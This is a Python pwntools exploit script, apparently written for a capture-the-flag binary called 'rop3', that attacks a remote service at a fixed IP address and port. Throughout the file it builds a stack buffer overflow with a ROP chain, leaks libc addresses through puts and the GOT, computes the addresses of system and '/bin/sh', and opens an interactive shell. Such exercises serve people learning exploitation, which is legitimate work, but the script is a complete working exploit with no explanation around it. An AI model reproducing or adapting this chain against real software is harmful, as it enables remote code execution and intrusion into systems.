#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = not False
debug =  False

c = 0
pwn_file = "./rop3"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3124)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x40063f
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'

# print libc
new_rbp = p64(0x00601900)
p = b'A' * (0x28 - 8) # padding
p += new_rbp # rbp
p += p64(0x4006a3) + p64(elf.got['puts']) + p64(elf.plt['puts'])# pop rdi ; ret ; jmp puts
p += p64(0x4006a3) + p64(elf.got['gets']) + p64(elf.plt['puts'])# pop rdi ; ret ; jmp puts
p += p64(elf.symbols['main']) # try again
c.sendline(p)

c.recvn(0x20 + 1) # drop A
puts_addr = u64(c.recvn(7)[:-1] + b'\0\0' )
gets_addr = u64(c.recvn(7)[:-1] + b'\0\0' )

print(hex(puts_addr), hex(gets_addr))


# get shell
system_addr = puts_addr - 0x2a300
sh_addr = system_addr + 0x147a77

p = b'A' * (0x28 - 8) # padding
p += new_rbp # rbp
p += p64(0x4006a3) + p64(sh_addr) + p64(system_addr)# pop rdi ; ret ; ret2system

c.sendline(p)

c.interactive()
c.close()

